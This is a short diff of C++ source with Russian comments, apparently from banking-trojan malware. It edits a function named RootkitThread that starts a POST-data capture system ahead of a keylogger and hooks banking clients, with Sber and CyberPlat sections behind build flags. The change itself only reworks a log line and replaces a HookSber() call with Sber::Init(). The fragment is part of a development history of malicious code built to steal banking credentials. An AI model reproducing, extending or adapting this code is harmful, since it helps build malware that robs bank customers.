@@ -430,7 +430,7 @@ DWORD WINAPI RootkitThread(LPVOID)
 		hashApp = File::GetNameHashA(AppName, true);
 	}
 
-    RTKDBG("rotkit", "Запущен процесс %s", AppName);
+    RTKDBG("rotkit", "Запущен процесс %s", AppName );
 
 	//!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 	//инициализируем систему оповещения о пост данных, должен быть запущен раньше кейлогера
@@ -444,7 +444,7 @@ DWORD WINAPI RootkitThread(LPVOID)
 	#endif
 
 	#ifdef SBERH
-		HookSber();
+		Sber::Init( AppName, hashApp );
 	#endif 
 
 	#ifdef CyberPlatDLLH
